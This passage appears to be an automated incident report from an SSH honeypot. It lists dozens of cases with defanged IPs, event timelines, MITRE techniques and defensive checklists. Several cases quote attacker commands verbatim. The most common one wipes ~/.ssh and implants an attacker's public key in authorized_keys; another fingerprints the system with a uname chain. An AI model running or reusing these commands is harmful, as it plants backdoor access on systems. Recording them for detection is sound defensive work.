| **First Seen** | 2026-10-21 03:04 |
| **Last Seen** | 2026-10-21 03:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:04:15` | `cowrie.session.connect` |
| `2026-10-21 03:04:15` | `cowrie.client.version` |
| `2026-10-21 03:04:15` | `cowrie.client.kex` |
| `2026-10-21 03:04:16` | `cowrie.login.success` |
| `2026-10-21 03:04:18` | `cowrie.direct-tcpip.request` |
| `2026-10-21 03:04:18` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 03:04:18` | `cowrie.direct-tcpip.data` |
| `2026-10-21 03:04:19` | `cowrie.direct-tcpip.request` |
| `2026-10-21 03:04:19` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 03:04:19` | `cowrie.direct-tcpip.data` |
| `2026-10-21 03:04:20` | `cowrie.direct-tcpip.request` |
| `2026-10-21 03:04:20` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 03:04:20` | `cowrie.direct-tcpip.data` |
| `2026-10-21 03:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26a1803fd97f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-10-21 03:08 |
| **Last Seen** | 2026-10-21 03:09 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:08:21` | `cowrie.session.connect` |
| `2026-10-21 03:08:21` | `cowrie.client.version` |
| `2026-10-21 03:08:21` | `cowrie.client.kex` |
| `2026-10-21 03:08:21` | `cowrie.login.success` |
| `2026-10-21 03:08:30` | `cowrie.direct-tcpip.request` |
| `2026-10-21 03:08:34` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 03:08:34` | `cowrie.direct-tcpip.data` |
| `2026-10-21 03:08:42` | `cowrie.direct-tcpip.request` |
| `2026-10-21 03:08:49` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 03:08:49` | `cowrie.direct-tcpip.data` |
| `2026-10-21 03:08:56` | `cowrie.direct-tcpip.request` |
| `2026-10-21 03:09:03` | `cowrie.direct-tcpip.ja4` |
| `2026-10-21 03:09:03` | `cowrie.direct-tcpip.data` |
| `2026-10-21 03:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbbdbed783e3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-10-21 03:12 |
| **Last Seen** | 2026-10-21 03:12 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:12:14` | `cowrie.session.connect` |
| `2026-10-21 03:12:16` | `cowrie.client.version` |
| `2026-10-21 03:12:16` | `cowrie.client.kex` |
| `2026-10-21 03:12:22` | `cowrie.login.success` |
| `2026-10-21 03:12:24` | `cowrie.session.params` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| `2026-10-21 03:12:24` | `cowrie.command.success` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| `2026-10-21 03:12:24` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64ea793588df

| Field | Detail |
|---|---|
| **Source IP** | `182.76.115[.]214` |
| **First Seen** | 2026-10-21 03:12 |
| **Last Seen** | 2026-10-21 03:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:12:34` | `cowrie.session.connect` |
| `2026-10-21 03:12:34` | `cowrie.client.version` |
| `2026-10-21 03:12:35` | `cowrie.client.kex` |
| `2026-10-21 03:12:36` | `cowrie.login.success` |
| `2026-10-21 03:12:37` | `cowrie.session.params` |
| `2026-10-21 03:12:37` | `cowrie.command.input` |
| `2026-10-21 03:12:37` | `cowrie.command.failed` |
| `2026-10-21 03:12:37` | `cowrie.log.closed` |
| `2026-10-21 03:12:38` | `cowrie.session.params` |
| `2026-10-21 03:12:38` | `cowrie.command.input` |
| `2026-10-21 03:12:39` | `cowrie.session.file_download` |
| `2026-10-21 03:12:39` | `cowrie.log.closed` |
| `2026-10-21 03:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.115[.]214` to AbuseIPDB if not already reported
- [ ] Block `182.76.115[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b4204b60a7

| Field | Detail |
|---|---|
| **Source IP** | `182.76.115[.]214` |
| **First Seen** | 2026-10-21 03:12 |
| **Last Seen** | 2026-10-21 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:12:39` | `cowrie.session.connect` |
| `2026-10-21 03:12:39` | `cowrie.client.version` |
| `2026-10-21 03:12:39` | `cowrie.client.kex` |
| `2026-10-21 03:12:40` | `cowrie.login.success` |
| `2026-10-21 03:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.115[.]214` to AbuseIPDB if not already reported
- [ ] Block `182.76.115[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0dbcfb2ed4

| Field | Detail |
|---|---|
| **Source IP** | `200.77.172[.]159` |
| **First Seen** | 2026-10-21 03:13 |
| **Last Seen** | 2026-10-21 03:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:13:27` | `cowrie.session.connect` |
| `2026-10-21 03:13:27` | `cowrie.client.version` |
| `2026-10-21 03:13:27` | `cowrie.client.kex` |
| `2026-10-21 03:13:28` | `cowrie.login.success` |
| `2026-10-21 03:13:28` | `cowrie.session.params` |
| `2026-10-21 03:13:28` | `cowrie.command.input` |
| `2026-10-21 03:13:28` | `cowrie.command.failed` |
| `2026-10-21 03:13:28` | `cowrie.log.closed` |
| `2026-10-21 03:13:29` | `cowrie.session.params` |
| `2026-10-21 03:13:29` | `cowrie.command.input` |
| `2026-10-21 03:13:29` | `cowrie.session.file_download` |
| `2026-10-21 03:13:29` | `cowrie.log.closed` |
| `2026-10-21 03:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.77.172[.]159` to AbuseIPDB if not already reported
- [ ] Block `200.77.172[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc39cfedbae

| Field | Detail |
|---|---|
| **Source IP** | `200.77.172[.]159` |
| **First Seen** | 2026-10-21 03:13 |
| **Last Seen** | 2026-10-21 03:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:13:29` | `cowrie.session.connect` |
| `2026-10-21 03:13:29` | `cowrie.client.version` |
| `2026-10-21 03:13:29` | `cowrie.client.kex` |
| `2026-10-21 03:13:30` | `cowrie.login.success` |
| `2026-10-21 03:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.77.172[.]159` to AbuseIPDB if not already reported
- [ ] Block `200.77.172[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d753b4302147

| Field | Detail |
|---|---|
| **Source IP** | `182.253.175[.]172` |
| **First Seen** | 2026-10-21 03:13 |
| **Last Seen** | 2026-10-21 03:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:13:31` | `cowrie.session.connect` |
| `2026-10-21 03:13:31` | `cowrie.client.version` |
| `2026-10-21 03:13:31` | `cowrie.client.kex` |
| `2026-10-21 03:13:32` | `cowrie.login.success` |
| `2026-10-21 03:13:33` | `cowrie.session.params` |
| `2026-10-21 03:13:33` | `cowrie.command.input` |
| `2026-10-21 03:13:33` | `cowrie.command.failed` |
| `2026-10-21 03:13:33` | `cowrie.log.closed` |
| `2026-10-21 03:13:34` | `cowrie.session.params` |
| `2026-10-21 03:13:34` | `cowrie.command.input` |
| `2026-10-21 03:13:34` | `cowrie.session.file_download` |
| `2026-10-21 03:13:34` | `cowrie.log.closed` |
| `2026-10-21 03:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.175[.]172` to AbuseIPDB if not already reported
- [ ] Block `182.253.175[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6db0218bd98a

| Field | Detail |
|---|---|
| **Source IP** | `182.253.175[.]172` |
| **First Seen** | 2026-10-21 03:13 |
| **Last Seen** | 2026-10-21 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:13:35` | `cowrie.session.connect` |
| `2026-10-21 03:13:35` | `cowrie.client.version` |
| `2026-10-21 03:13:35` | `cowrie.client.kex` |
| `2026-10-21 03:13:36` | `cowrie.login.success` |
| `2026-10-21 03:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.175[.]172` to AbuseIPDB if not already reported
- [ ] Block `182.253.175[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d5f7c607228

| Field | Detail |
|---|---|
| **Source IP** | `194.226.49[.]237` |
| **First Seen** | 2026-10-21 03:15 |
| **Last Seen** | 2026-10-21 03:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:15:00` | `cowrie.session.connect` |
| `2026-10-21 03:15:00` | `cowrie.client.version` |
| `2026-10-21 03:15:00` | `cowrie.client.kex` |
| `2026-10-21 03:15:01` | `cowrie.login.success` |
| `2026-10-21 03:15:02` | `cowrie.session.params` |
| `2026-10-21 03:15:02` | `cowrie.command.input` |
| `2026-10-21 03:15:02` | `cowrie.command.failed` |
| `2026-10-21 03:15:02` | `cowrie.log.closed` |
| `2026-10-21 03:15:03` | `cowrie.session.params` |
| `2026-10-21 03:15:03` | `cowrie.command.input` |
| `2026-10-21 03:15:03` | `cowrie.session.file_download` |
| `2026-10-21 03:15:03` | `cowrie.log.closed` |
| `2026-10-21 03:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.226.49[.]237` to AbuseIPDB if not already reported
- [ ] Block `194.226.49[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d269ab8c3dea

| Field | Detail |
|---|---|
| **Source IP** | `194.226.49[.]237` |
| **First Seen** | 2026-10-21 03:15 |
| **Last Seen** | 2026-10-21 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:15:03` | `cowrie.session.connect` |
| `2026-10-21 03:15:03` | `cowrie.client.version` |
| `2026-10-21 03:15:03` | `cowrie.client.kex` |
| `2026-10-21 03:15:04` | `cowrie.login.success` |
| `2026-10-21 03:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.226.49[.]237` to AbuseIPDB if not already reported
- [ ] Block `194.226.49[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c043f2822c5

| Field | Detail |
|---|---|
| **Source IP** | `43.128.3[.]201` |
| **First Seen** | 2026-10-21 03:15 |
| **Last Seen** | 2026-10-21 03:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:15:13` | `cowrie.session.connect` |
| `2026-10-21 03:15:13` | `cowrie.client.version` |
| `2026-10-21 03:15:13` | `cowrie.client.kex` |
| `2026-10-21 03:15:14` | `cowrie.login.success` |
| `2026-10-21 03:15:14` | `cowrie.session.params` |
| `2026-10-21 03:15:14` | `cowrie.command.input` |
| `2026-10-21 03:15:14` | `cowrie.command.failed` |
| `2026-10-21 03:15:15` | `cowrie.log.closed` |
| `2026-10-21 03:15:16` | `cowrie.session.params` |
| `2026-10-21 03:15:16` | `cowrie.command.input` |
| `2026-10-21 03:15:16` | `cowrie.session.file_download` |
| `2026-10-21 03:15:16` | `cowrie.log.closed` |
| `2026-10-21 03:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.3[.]201` to AbuseIPDB if not already reported
- [ ] Block `43.128.3[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-736de371fe0d

| Field | Detail |
|---|---|
| **Source IP** | `43.128.3[.]201` |
| **First Seen** | 2026-10-21 03:15 |
| **Last Seen** | 2026-10-21 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 03:15:16` | `cowrie.session.connect` |
| `2026-10-21 03:15:16` | `cowrie.client.version` |
| `2026-10-21 03:15:16` | `cowrie.client.kex` |
| `2026-10-21 03:15:17` | `cowrie.login.success` |
| `2026-10-21 03:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.3[.]201` to AbuseIPDB if not already reported
- [ ] Block `43.128.3[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (127) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-ac4ec7037a1b | HIGH | `41.173.43[.]34` | 2026-10-21 03:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c92d1effe5a2 | HIGH | `41.173.43[.]34` | 2026-10-21 03:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0b488beb2c48 | HIGH | `180.106.83[.]59` | 2026-10-21 03:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f2a35f3da3a1 | HIGH | `180.106.83[.]59` | 2026-10-21 03:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f4d9d1f5fb18 | HIGH | `62.193.91[.]121` | 2026-10-21 03:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8e9d5023e22d | HIGH | `62.193.91[.]121` | 2026-10-21 03:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-95ec78cae2d2 | HIGH | `74.118.81[.]170` | 2026-10-21 03:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3ce322d1dc72 | HIGH | `74.118.81[.]170` | 2026-10-21 03:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e13110e42827 | HIGH | `103.211.76[.]8` | 2026-10-21 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-eb098ffa7586 | HIGH | `217.60.255[.]130` | 2026-10-21 04:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-996beb8bd515 | HIGH | `172.236.228[.]220` | 2026-10-21 04:44 | Y | 3 | 0 | `T1078` |
| IR-bbef3e39af3e | HIGH | `34.22.237[.]231` | 2026-10-21 04:48 | Y | 2 | 0 | `T1078` |
| IR-cabf33c1663d | HIGH | `34.22.237[.]231` | 2026-10-21 04:48 | Y | 1 | 0 | `T1078` |
| IR-3e74859f4b89 | HIGH | `34.22.237[.]231` | 2026-10-21 04:48 | Y | 0 | 0 | `T1078` |
| IR-0b3996d9120e | HIGH | `64.62.156[.]66` | 2026-10-21 04:56 | Y | 3 | 0 | `T1078` |
| IR-94ec1cc4a98a | HIGH | `180.76.236[.]71` | 2026-10-21 05:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6d5e1ba92016 | HIGH | `180.76.236[.]71` | 2026-10-21 05:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-079c4fd1cee7 | HIGH | `34.14.70[.]113` | 2026-10-21 05:21 | Y | 2 | 0 | `T1078` |
| IR-173b3988d0b3 | HIGH | `34.14.70[.]113` | 2026-10-21 05:21 | Y | 1 | 0 | `T1078` |
| IR-d5959aced6cc | HIGH | `34.14.70[.]113` | 2026-10-21 05:21 | Y | 0 | 0 | `T1078` |
| IR-e5539c331abe | HIGH | `141.11.122[.]40` | 2026-10-21 05:24 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-7db70f3ad55b | HIGH | `118.145.107[.]219` | 2026-10-21 05:25 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-c16ff006417d | HIGH | `118.145.107[.]219` | 2026-10-21 05:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3fdb8226e841 | HIGH | `176.53.159[.]196` | 2026-10-21 05:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-044480125b6c | HIGH | `200.175.149[.]58` | 2026-10-21 05:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2cd2e3947d9c | HIGH | `200.175.149[.]58` | 2026-10-21 05:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-adf21a3d687b | HIGH | `96.126.108[.]58` | 2026-10-21 05:31 | Y | 0 | 0 | `T1078` |
| IR-3dc7572f8d28 | HIGH | `96.126.108[.]58` | 2026-10-21 05:32 | Y | 8 | 0 | `T1078` |
| IR-5b6fedfc55d1 | HIGH | `43.133.140[.]5` | 2026-10-21 05:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1ee670781c70 | HIGH | `43.133.140[.]5` | 2026-10-21 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6b0bde780a12 | HIGH | `77.90.185[.]17` | 2026-10-21 05:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-50ca661aceda | HIGH | `103.211.76[.]8` | 2026-10-21 06:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e9cc0ba923a1 | HIGH | `217.60.255[.]130` | 2026-10-21 06:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b364d840904a | HIGH | `35.240.59[.]131` | 2026-10-21 06:11 | Y | 2 | 0 | `T1078` |
| IR-76f265807138 | HIGH | `35.240.59[.]131` | 2026-10-21 06:11 | Y | 1 | 0 | `T1078` |
| IR-3683763794e0 | HIGH | `35.240.59[.]131` | 2026-10-21 06:11 | Y | 0 | 0 | `T1078` |
| IR-71590d4917f2 | HIGH | `47.236.127[.]247` | 2026-10-21 06:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a24a8da4a7f7 | HIGH | `47.236.127[.]247` | 2026-10-21 06:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8eb6f40dd28f | HIGH | `155.133.203[.]126` | 2026-10-21 06:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-85217616e4a2 | HIGH | `155.133.203[.]126` | 2026-10-21 06:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d7d6c33b2afe | HIGH | `216.126.225[.]6` | 2026-10-21 06:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eb445e70e05f | HIGH | `216.126.225[.]6` | 2026-10-21 06:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7cf441005b8d | HIGH | `176.53.159[.]196` | 2026-10-21 06:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d3111f3b24ce | HIGH | `103.248.120[.]6` | 2026-10-21 06:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8e17410c7c79 | HIGH | `103.248.120[.]6` | 2026-10-21 06:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7551ba595747 | HIGH | `43.173.38[.]56` | 2026-10-21 06:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64b84b109ac8 | HIGH | `101.96.195[.]17` | 2026-10-21 06:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a6c5181d4119 | HIGH | `130.12.180[.]51` | 2026-10-21 06:41 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-8405b81b74e2 | HIGH | `66.175.213[.]4` | 2026-10-21 06:42 | Y | 3 | 0 | `T1078` |
